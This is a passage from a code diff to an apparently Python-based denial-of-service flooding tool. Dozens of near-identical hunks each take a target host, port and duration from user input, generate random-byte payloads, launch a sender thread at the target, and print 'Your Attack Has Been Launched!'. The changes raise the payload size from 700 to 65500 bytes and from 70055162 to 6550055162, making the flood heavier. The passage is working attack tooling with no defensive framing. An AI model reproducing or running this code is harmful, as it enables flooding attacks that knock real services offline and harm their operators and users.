 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1958,7 +1958,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1974,7 +1974,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 70055162
+					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -1990,7 +1990,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2006,7 +2006,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2022,7 +2022,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2038,7 +2038,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2054,7 +2054,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2070,7 +2070,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2086,7 +2086,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2102,7 +2102,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2118,7 +2118,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 70055162
+					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2134,7 +2134,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2150,7 +2150,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2166,7 +2166,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2182,7 +2182,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2198,7 +2198,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2214,7 +2214,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 70055162
+					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2230,7 +2230,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2246,7 +2246,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2262,7 +2262,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2278,7 +2278,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2294,7 +2294,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2310,7 +2310,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2326,7 +2326,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2342,7 +2342,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
@@ -2358,7 +2358,7 @@ def main():
 				else:
 					sinput, host, timer, port = sin.split(" ")
 					socket.gethostbyname(host)
-					pack = 700
+					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
 					print("\033[97mYour Attack Has Been Launched!")
